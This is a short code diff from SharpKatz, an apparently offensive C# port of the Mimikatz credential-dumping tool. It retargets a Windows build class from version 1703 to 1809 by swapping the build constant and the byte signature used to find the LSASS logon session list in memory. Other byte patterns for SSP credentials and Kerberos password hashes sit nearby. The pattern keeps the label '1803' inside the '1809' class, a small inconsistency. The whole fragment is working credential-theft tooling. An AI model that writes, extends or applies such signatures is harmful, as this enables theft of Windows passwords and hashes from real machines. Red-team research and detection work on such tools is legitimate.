@@ -4,7 +4,7 @@ using System.Runtime.InteropServices;
 
 namespace SharpKatz.WinBuild
 {
-    class WinBuild1703 : IWinBuild
+    class WinBuild1809 : IWinBuild
     {
         public int build { get; set; }
         public Type PrimaryCredentialsType { get; set; }
@@ -39,10 +39,10 @@ namespace SharpKatz.WinBuild
         byte[] PTRN_WALL_LiveLocateLogonSession = { 0x74, 0x25, 0x8b };
         byte[] PTRN_WIN10_SspCredentialList = { 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15 };
         byte[] PTRN_WIN6_PasswdSet = { 0x48, 0x3b, 0xd9, 0x74 };
-        byte[] PTRN_WN1703_LogonSessionList = { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
+        byte[] PTRN_WN1803_LogonSessionList = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
         byte[] keyIVSigAll = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
 
-        public WinBuild1703()
+        public WinBuild1809()
         {
             PrimaryCredentialsType = typeof(Msv1.KIWI_MSV1_0_PRIMARY_CREDENTIALS);
             PrimaryCredentialType = typeof(Msv1.MSV1_0_PRIMARY_CREDENTIAL_10_1607);
@@ -56,9 +56,9 @@ namespace SharpKatz.WinBuild
             KerberosLogonSessionType = typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10_1607);
             KerberosHashType = typeof(Kerberos.KERB_HASHPASSWORD_6_1607);
 
-            build = OSVersionHelper.KULL_M_WIN_BUILD_10_1703;
+            build = OSVersionHelper.KULL_M_WIN_BUILD_10_1809;
 
-            logonSessionListSign = PTRN_WN1703_LogonSessionList;
+            logonSessionListSign = PTRN_WN1803_LogonSessionList;
 
             LOGONSESSIONLISTOFFSET = 23;
             LOGONSESSIONSLISTCOUNTOFFSET = -4;
